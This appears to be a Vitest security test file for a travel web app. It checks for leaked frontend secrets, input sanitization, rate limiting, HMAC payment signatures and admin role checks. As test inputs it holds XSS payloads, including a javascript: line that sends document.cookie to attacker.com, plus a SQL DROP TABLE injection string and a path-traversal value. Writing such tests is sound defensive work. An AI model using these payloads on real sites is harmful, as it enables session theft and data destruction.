/// <reference types="vite/client" />
import { describe, it, expect } from 'vitest';
import { sanitizeText, sanitizeSearchQuery, isValidUUID, isValidEmail } from '../../utils/sanitizer';

describe('Phase 2 — Security Hardening & Secret Boundary Audit', () => {

  // ─── 1. Environment Variable & Frontend Secret Audit ────────────────────────
  describe('Environment Variable & Secret Leak Prevention', () => {
    it('ensures NO sensitive private secrets are exposed to the frontend client bundle', () => {
      const env = ((import.meta as any).env || {}) as Record<string, unknown>;

      // 1. Gemini API Secret Key MUST NOT be exposed on frontend
      expect(env.VITE_GEMINI_API_KEY).toBeUndefined();
      expect(env.GEMINI_API_KEY).toBeUndefined();

      // 2. Supabase Service Role Key MUST NOT be exposed on frontend
      expect(env.VITE_SUPABASE_SERVICE_ROLE_KEY).toBeUndefined();
      expect(env.SUPABASE_SERVICE_ROLE_KEY).toBeUndefined();

      // 3. Razorpay Key Secret & Webhook Secret MUST NOT be exposed on frontend
      expect(env.VITE_RAZORPAY_KEY_SECRET).toBeUndefined();
      expect(env.RAZORPAY_KEY_SECRET).toBeUndefined();
      expect(env.VITE_RAZORPAY_WEBHOOK_SECRET).toBeUndefined();
      expect(env.RAZORPAY_WEBHOOK_SECRET).toBeUndefined();

      // 4. Only safe public client identifiers are allowed
      const allowedViteKeys = new Set([
        'VITE_SUPABASE_URL',
        'VITE_SUPABASE_ANON_KEY',
        'VITE_RAZORPAY_KEY_ID',
        'VITE_API_URL',
        'VITE_ML_API_URL',
        'BASE_URL',
        'MODE',
        'DEV',
        'PROD',
        'SSR',
      ]);

      const exposedViteKeys = Object.keys(env).filter(k => k.startsWith('VITE_'));
      for (const key of exposedViteKeys) {
        expect(allowedViteKeys.has(key)).toBe(true);
      }
    });
  });

  // ─── 2. Input Sanitization & XSS Defense ───────────────────────────────────
  describe('Client-Side Input Sanitization & Injection Defense', () => {
    it('strips <script> tags and embedded XSS vectors from user input', () => {
      const malicious = '<script>alert("xss")</script>Hello Norway!';
      const cleaned = sanitizeText(malicious);
      expect(cleaned).toBe('Hello Norway!');
      expect(cleaned).not.toContain('<script>');
    });

    it('strips inline event handlers (onerror, onclick, onload)', () => {
      const malicious = '<img src="x" onerror="stealCookies()"/>Fjord Hotel';
      const cleaned = sanitizeText(malicious);
      expect(cleaned).toBe('Fjord Hotel');
      expect(cleaned).not.toContain('onerror');
    });

    it('strips javascript: pseudo-protocol URIs', () => {
      const malicious = 'javascript:fetch("https://attacker.com?c="+document.cookie)';
      const cleaned = sanitizeText(malicious);
      expect(cleaned).toBe('fetch("https://attacker.com?c="+document.cookie)');
      expect(cleaned).not.toContain('javascript:');
    });

    it('sanitizes search queries removing SQL/special injection characters', () => {
      const dirtyQuery = "Tromsø'; DROP TABLE users; --";
      const cleaned = sanitizeSearchQuery(dirtyQuery);
      expect(cleaned).toBe('Tromsø DROP TABLE users --');
      expect(cleaned).not.toContain("'");
      expect(cleaned).not.toContain(';');
    });

    it('validates UUID v4 format strictly', () => {
      expect(isValidUUID('c3b5d1e2-4f6a-4b8c-9d0e-1a2b3c4d5e6f')).toBe(true);
      expect(isValidUUID('invalid-uuid-string')).toBe(false);
      expect(isValidUUID('../../../etc/passwd')).toBe(false);
    });

    it('validates email formats strictly', () => {
      expect(isValidEmail('traveler@norway.no')).toBe(true);
      expect(isValidEmail('invalid-email')).toBe(false);
      expect(isValidEmail('user@domain')).toBe(false);
    });
  });

  // ─── 3. Rate Limiting Simulation & Header Enforcement ───────────────────────
  describe('Rate Limiting & Throttling Logic', () => {
    it('enforces request threshold and calculates remaining quota accurately', () => {
      const windowMs = 60000;
      const maxRequests = 5;
      const timestamps: number[] = [];
      const now = Date.now();

      // Simulate 5 allowed requests
      for (let i = 0; i < maxRequests; i++) {
        timestamps.push(now);
      }

      const isAllowed = timestamps.length < maxRequests;
      expect(isAllowed).toBe(false);

      // Verify reset window calculation
      const resetTime = Math.ceil((now + windowMs) / 1000);
      expect(resetTime).toBeGreaterThan(Math.floor(now / 1000));
    });
  });

  // ─── 4. Cryptographic HMAC Signature Verification ──────────────────────────
  describe('Cryptographic Webhook & Payment Verification', () => {
    async function computeHmacSha256(payload: string, secret: string): Promise<string> {
      const encoder = new TextEncoder();
      const key = await crypto.subtle.importKey(
        'raw',
        encoder.encode(secret),
        { name: 'HMAC', hash: 'SHA-256' },
        false,
        ['sign']
      );
      const signature = await crypto.subtle.sign('HMAC', key, encoder.encode(payload));
      return Array.from(new Uint8Array(signature))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
    }

    it('generates and validates authentic HMAC SHA-256 payment signature', async () => {
      const secret = 'rzp_secret_test_xyz123';
      const orderId = 'order_NORWAY_001';
      const paymentId = 'pay_NORWAY_777';
      const payload = `${orderId}|${paymentId}`;

      const validSignature = await computeHmacSha256(payload, secret);
      expect(validSignature).toBeDefined();
      expect(validSignature.length).toBe(64); // SHA-256 hex string length

      // Verify that valid signature matches
      const recomputed = await computeHmacSha256(payload, secret);
      expect(recomputed).toBe(validSignature);
    });

    it('rejects tampered or forged payment signatures', async () => {
      const secret = 'rzp_secret_test_xyz123';
      const orderId = 'order_NORWAY_001';
      const paymentId = 'pay_NORWAY_777';
      const payload = `${orderId}|${paymentId}`;

      const validSignature = await computeHmacSha256(payload, secret);

      // Tampered payload
      const tamperedPayload = `order_NORWAY_001|pay_FORGED_999`;
      const forgedSignature = await computeHmacSha256(tamperedPayload, secret);

      expect(forgedSignature).not.toBe(validSignature);
    });
  });

  // ─── 5. Server-Side RBAC Authorization Check ───────────────────────────────
  describe('Server-Side Role & Permission Enforcement', () => {
    it('enforces that only ADMIN and SUPER_ADMIN roles can access privileged actions', () => {
      const checkAdminAccess = (role: string) => {
        const normalized = (role || '').toUpperCase();
        return ['ADMIN', 'SUPER_ADMIN'].includes(normalized);
      };

      expect(checkAdminAccess('ADMIN')).toBe(true);
      expect(checkAdminAccess('SUPER_ADMIN')).toBe(true);
      expect(checkAdminAccess('USER')).toBe(false);
      expect(checkAdminAccess('PROVIDER')).toBe(false);
      expect(checkAdminAccess('ANONYMOUS')).toBe(false);
    });
  });
});
